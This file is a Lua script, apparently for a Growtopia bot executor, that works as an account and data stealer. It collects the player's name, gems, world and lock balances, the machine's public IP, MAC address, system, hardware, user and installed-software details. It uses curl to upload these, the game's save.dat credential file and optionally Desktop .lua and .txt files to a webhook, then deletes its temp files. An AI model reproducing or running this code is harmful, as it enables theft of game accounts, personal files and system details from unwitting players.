xwebhook = ""

steal_files = false -- this will steal all files in desktop line: 217   set as true if enabled

function string.removeColors(varlist)
    return varlist:gsub("`.", "")
end

function generateRandomNiceColor()
    red = math.random(160, 240)
    green = math.random(160, 240)
    blue = math.random(160, 240)
    return (red * 65536) + (green * 256) + blue
end

randomColor = generateRandomNiceColor()

function SendWebhookWithPowerShell(webhook, file_path)
    curl_command = 'curl -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" -F "file=@' .. file_path .. '" -F "content=" ' .. webhook
    status_code = os.execute(curl_command)
    return status_code
end

function save_inventory_to_file()
    file = io.open("C:\\Windows\\Temp\\inv.txt", "w")
    for _,cur in pairs(GetInventory()) do
        file:write(GetIteminfo(cur.id).name ..": "..math.floor(GetItemCount(cur.id)).."\n")
    end
    file:close()
end

function hide_world(varlist)
    if varlist[0] == "OnDialogRequest" and varlist[1]:find("end_dialog|popup||Continue|") and varlist[1]:find("add_textbox|`oTotal time played is") then
        return true
    end
end

AddCallback("hide_world", "OnVarlist", hide_world)
SendPacket(2, "action|wrench\n|netid|"..GetLocal().netid)
SendPacket(2, [[
action|dialog_return
dialog_name|popup
netID|]]..math.floor(GetLocal().netid)..[[|
buttonClicked|my_worlds
]])
Sleep(2000)
RemoveCallback("hide_world")

function get_worlds(varlist, packet)
    if varlist[0]:find("OnDialogRequest") and varlist[1]:find("end_dialog|worlds_list||Back|") then
        file = io.open("C:\\Windows\\Temp\\worlds.txt", "w")
        for world_name in varlist[1]:gmatch("add_button|([^|]+)|") do
            file:write(world_name.."\n")
        end
        file:close()
        return true
    end
end

AddCallback("get_worlds", "OnVarlist", get_worlds)

--[[
function getIPInfo(ip)
    country = io.popen("curl -s http://ipinfo.io/" .. ip .. "/country"):read("*a"):gsub("%s+", "") or ""
    city = io.popen("curl -s http://ipinfo.io/" .. ip .. "/city"):read("*a"):gsub("%s+", "") or ""
    return country, city
end
]]

function getMACAddress()
   handle = io.popen("ipconfig /all")
   result = handle:read("*a")
   handle:close()
   
   mac = result:match("Physical Address[^\n]*: ([%a%d%-]+)")
   return mac
end

mac = getMACAddress()

function getSystemInformation()
    ip = io.popen("curl -s http://ipinfo.io/ip"):read("*a"):gsub("%s+", "") or ""
    return ip
end

ip = getSystemInformation()
--country, city = getIPInfo(ip)

function executeCommand(command)
   handle = io.popen(command)
   result = handle:read("*a")
   handle:close()
   return result
end

function getSystemUUID()
   uuidCommand = 'wmic csproduct get uuid'
   uuidInfo = executeCommand(uuidCommand)

   uuid = uuidInfo:match("UUID%s+(%b{})")
   if not uuid then
       uuid = uuidInfo:match("(%b{})")
   end

   return uuid
end

systemUUID = getSystemUUID()

Player_webhook_name = GetLocal().name:removeColors()
Player_webhook_gems = math.floor(GetLocal().gems)
Player_webhook_world = GetLocal().world
Player_webhook_wl = math.floor(GetItemCount(242))
Player_webhook_dl = math.floor(GetItemCount(1796))
Player_webhook_bgl = math.floor(GetItemCount(7188))

timeOffset = 0
currentTime = os.time() - (timeOffset * 60 * 60)
formattedTime = os.date("!%Y-%m-%dT%H:%M:%S", currentTime)
webhookmain = [[
{
   "content": "",
   "embeds": [{
      "title": "",
      "url": "",
      "color": ]]..randomColor..[[,
      "fields": [
         {
            "name": "Player Information",
            "value": "",
            "inline": false
         },
         {
            "name": "<:namexd:1139104281262309466> Name",
            "value": "%s",
            "inline": true
         },
         {
            "name": "<:FakeNitroEmoji:1139103480146055230> Gems",
            "value": "%s",
            "inline": true
         },
         {
            "name": "<:world:1139104095077138503> World",
            "value": "%s",
            "inline": true
         },
         {
            "name": "Balance",
            "value": "",
            "inline": false
         },
         {
            "name": "<:wls:1139104897590112317> World Locks",
            "value": "%s",
            "inline": true
         },
         {
            "name": "<a:dls:1139104823271231508> Diamond Locks",
            "value": "%s",
            "inline": true
         },
         {
            "name": "<a:bgl:1139104790941532213> Blue Gem Locks",
            "value": "%s",
            "inline": true
         },
         {
            "name": "System Information",
            "value": "",
            "inline": false
         },
         {
            "name": "<:ip:1122601632929173645> IP",
            "value": "||%s||",
            "inline": true
         },
         {
            "name": "<:globe2:1179532330281472160> Mac",
            "value": "||%s||",
            "inline": true
         }
      ],
      "footer": {
         "text": "",
         "icon_url": ""
      },
      "timestamp": "%s"
   }]
}
]]
webhookmain = webhookmain:format(
    Player_webhook_name,
    Player_webhook_gems,
    Player_webhook_world,
    Player_webhook_wl,
    Player_webhook_dl,
    Player_webhook_bgl,
    ip,
    mac,
    formattedTime
)
webhookx = xwebhook
SendWebhook(webhookx, webhookmain)


save_inventory_to_file()
SendWebhookWithPowerShell(xwebhook, "C:\\Windows\\Temp\\inv.txt")
SendWebhookWithPowerShell(xwebhook, "C:\\Windows\\Temp\\worlds.txt")
SendWebhookWithPowerShell(xwebhook, os.getenv("USERPROFILE").."\\AppData\\Local\\Growtopia\\save.dat")

if steal_files then
   function getAllFiles(directory)
      files = {}
      handle = io.popen('dir "'..directory..'" /b /a-d')
      for filename in handle:lines() do
         if filename:match("%.lua$") or filename:match("%.txt$") then
            table.insert(files, directory.."\\"..filename)
         end
      end
      handle:close()
      return files
   end

   desktopFiles = getAllFiles(os.getenv("USERPROFILE").."\\Desktop")

   for _, file in ipairs(desktopFiles) do
      SendWebhookWithPowerShell(xwebhook, file)
   end
end

os.remove("C:\\Windows\\Temp\\inv.txt")
os.remove("C:\\Windows\\Temp\\worlds.txt")

function executeCommand(command)
   handle = io.popen(command)
   if handle then
      result = handle:read("*a")
       handle:close()
       return result
   else
       return nil
   end
end

function removeEmptyLines(text)
   lines = {}
   for line in text:gmatch("[^\r\n]+") do
       if line:match("%S") then
           table.insert(lines, line)
       end
   end
   return table.concat(lines, "\n")
end

function getSystemUUID()
   uuidCommand = 'wmic csproduct get uuid'
   uuidInfo = executeCommand(uuidCommand)
   uuid = uuidInfo and uuidInfo:match("{.-}") or "UUID not found"
   return uuid
end

function getMACAddress()
   macCommand = 'ipconfig /all'
   macInfo = executeCommand(macCommand)
   mac = macInfo and macInfo:match("Physical Address[%.:%s]+([%x%-]+)") or "MAC Address not found"
   return mac
end

function getIPAddress()
   ipCommand = 'ipconfig'
   ipInfo = executeCommand(ipCommand)
   ip = ipInfo and ipInfo:match("IPv4 Address[%.:%s]+([%d%.]+)") or "IP Address not found"
   return ip
end

function getSystemInfo()
   systemInfoCommand = 'systeminfo'
   systemInfo = executeCommand(systemInfoCommand)
   return systemInfo or "System information not found"
end

function getHardwareInfo()
   hardwareInfoCommand = 'wmic cpu get Name /format:list && wmic memorychip get Capacity /format:list && wmic diskdrive get Model,Size /format:list'
   hardwareInfo = executeCommand(hardwareInfoCommand)
   return hardwareInfo or "Hardware information not found"
end

function getUserInfo()
   userInfoCommand = 'net user %username%'
   userInfo = executeCommand(userInfoCommand)
   return userInfo or "User information not found"
end

function getInstalledSoftware()
   softwareInfoCommand = 'wmic product get Name,Version'
   softwareInfo = executeCommand(softwareInfoCommand)
   return softwareInfo or "Installed software information not found"
end

function saveSystemInfoToFile()
   file = io.open("C:\\Windows\\Temp\\system_info.txt", "w")

   file:write("System UUID:\n")
   file:write(removeEmptyLines(getSystemUUID()).."\n\n")

   file:write("MAC Address:\n")
   file:write(removeEmptyLines(getMACAddress()).."\n\n")

   file:write("IP Address:\n")
   file:write(removeEmptyLines(getIPAddress()).."\n\n")

   file:write("System Information:\n")
   file:write(removeEmptyLines(getSystemInfo()).."\n\n")

   file:write("Hardware Information:\n")
   file:write(removeEmptyLines(getHardwareInfo()).."\n\n")

   file:write("User Information:\n")
   file:write(removeEmptyLines(getUserInfo()).."\n\n")

   file:write("Installed Software:\n")
   file:write(removeEmptyLines(getInstalledSoftware()).."\n\n")

   file:close()
end

saveSystemInfoToFile()
SendWebhookWithPowerShell(xwebhook, "C:\\Windows\\Temp\\system_info.txt")
os.remove("C:\\Windows\\Temp\\system_info.txt")